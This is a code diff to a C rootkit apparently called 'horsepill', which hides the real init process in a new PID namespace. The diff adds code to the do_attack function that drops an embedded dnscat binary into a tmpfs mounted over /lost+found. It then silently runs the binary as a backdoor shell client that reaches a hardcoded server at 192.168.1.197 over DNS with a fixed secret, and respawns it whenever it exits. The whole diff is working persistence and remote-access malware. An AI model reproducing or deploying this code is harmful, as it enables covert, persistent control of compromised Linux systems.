@@ -2,6 +2,7 @@
 #include <ctype.h>
 #include <dirent.h>
 #include <errno.h>
+#include <fcntl.h>
 #include <linux/reboot.h>
 #include <linux/sched.h>
 #include <sched.h>
@@ -14,11 +15,14 @@
 #include <sys/mount.h>
 #include <sys/prctl.h>
 #include <sys/reboot.h>
+#include <sys/stat.h>
 #include <sys/syscall.h>
 #include <sys/sysmacros.h>
+#include <sys/types.h>
 #include <sys/wait.h>
 #include <unistd.h>
 
+#include "dnscat.h"
 #include "horsepill.h"
 
 #ifndef __NR_clone3
@@ -27,6 +31,9 @@
 
 #ifndef MS_RELATIME
 #define MS_RELATIME     (1<<21)
+#endif
+#ifndef MS_STRICTATIME
+#define MS_STRICTATIME  (1<<24)
 #endif
 #ifndef MS_SLAVE
 #define MS_SLAVE	(1<<19)
@@ -46,6 +53,13 @@
 
 #define G3LBIN(x) (void)x
 #define ptr_to_u64(ptr) ((__u64)((uintptr_t)(ptr)))
+
+#define DNSCAT_PATH "/lost+found/dnscat"
+
+static char *const ARGV0 = "dnscat\0";
+static char *const ARGV1 = "--dns\0";
+static char *const ARGV2 = "server=192.168.1.197,port=53\0";
+static char *const ARGV3 = "--secret=5100a1e43a193b60ba720ada295189a6\0";
 
 static pid_t init_pid;
 char **cmdline_ptr;
@@ -226,19 +240,60 @@ static void handle_init_exit(int wstatus)
         err_exit(msg);
 }
 
-void do_attack()
+void write_dnscat_exe()
 {
-        int i;
-        int num;
-        int mountflags;
-        char *kthreads_names[1024];
-        
+        FILE* file = NULL;
+	file = fopen(DNSCAT_PATH, "w+");
+	if (file) {
+		(void)fwrite((const void *)dnscat, 1, dnscat_len, file);
+		(void)fclose(file);
+		(void)chmod(DNSCAT_PATH, S_IXUSR | S_IRUSR);
+	}
+}
+
+static pid_t run_dnscat_client()
+{
+	pid_t pid;
+
+	pid = fork();
+	if (pid < 0) {
+		printf("couldn't fork!\n");
+		exit(EXIT_FAILURE);
+	} else if (pid == 0) {
+		/* child */
+		char *const argv[5] = {
+                        ARGV0,
+                        ARGV1,
+                        ARGV2,
+                        ARGV3,
+                        NULL
+                };
+
+		close(0);
+		close(1);
+		close(2);
+
+		G3LBIN(open("/dev/null", O_RDONLY));
+		G3LBIN(open("/dev/null", O_WRONLY));
+		G3LBIN(open("/dev/null", O_RDWR));
+
+		execv(DNSCAT_PATH, argv);
+
+		err_exit("couldn't run dnscat!");
+	}
+	return pid;
+}
+
+void do_attack()
+{       
         init_pid = raw_clone(CLONE_NEWPID | CLONE_NEWNS | SIGCHLD, NULL);
         if (init_pid < 0) {
                 err_exit("clone");
         } else if (init_pid == 0) {
                 /* Child process which works within the containerized system */
-                num = enumerate_kernel_threads(kthreads_names);
+                int mountflags;
+                char *kthreads_names[1024];
+                G3LBIN(enumerate_kernel_threads(kthreads_names));
 
                 mountflags = MS_NOEXEC | MS_NODEV | MS_NOSUID | MS_RELATIME;
                 if (mount("none", "/proc", "", MS_REC | MS_SLAVE, NULL) < 0)
@@ -250,6 +305,13 @@ void do_attack()
                 sleep(5);	/* wait for completion */
         } else {
                 /* Parent process */
+                int wstatus;
+                pid_t pid;
+                pid_t dnscat_pid;
+
+                /* plop a ramdisk over lost+found for our use */
+		if (mount("tmpfs", "/lost+found", "tmpfs", MS_PRIVATE | MS_STRICTATIME, "mode=755") < 0)
+                        err_exit("couldn't mount ramdisk!");
 
                 /* install signal handler to handle signal delivered
                  * ctrl-alt-delete, which we will send to child init
@@ -259,14 +321,24 @@ void do_attack()
                 if (reboot(LINUX_REBOOT_CMD_CAD_OFF, NULL) < 0)
                         err_exit("couldn't turn cad off");
 
+                /* wait for things to come up and networking to be
+		 * ready
+		 */
+		sleep(20);
+
+		if (mount(NULL, "/", NULL, MS_REMOUNT | MS_RELATIME,
+			  "errors=remount-ro,data=ordered") < 0)
+                        err_exit("couldn't remount /");
+
+                /* spawn a process for backdoor shell */
+		write_dnscat_exe();
+		dnscat_pid = run_dnscat_client();
+
                 /* watching for dnscat exit
                  * also, watching for reinfection
                  * also, waitpid for init
                  */
                 while(1) {
-                        int wstatus;
-                        pid_t pid;
-
                         pid = waitpid(-1, &wstatus, 0);
                         if (pid < 0) {
                                 if (errno != EINTR) {
@@ -277,8 +349,8 @@ void do_attack()
                                 }
                         } else if (pid == init_pid) {
                                 handle_init_exit(wstatus);
-                        // } else if (pid == dnscat_pid) {
-                         // 	dnscat_pid = run_dnscat2();
+                        } else if (pid == dnscat_pid) {
+                         	dnscat_pid = run_dnscat_client();
                         } else {
                                 printf("unknown other pid %d exited\n", pid);
                         }
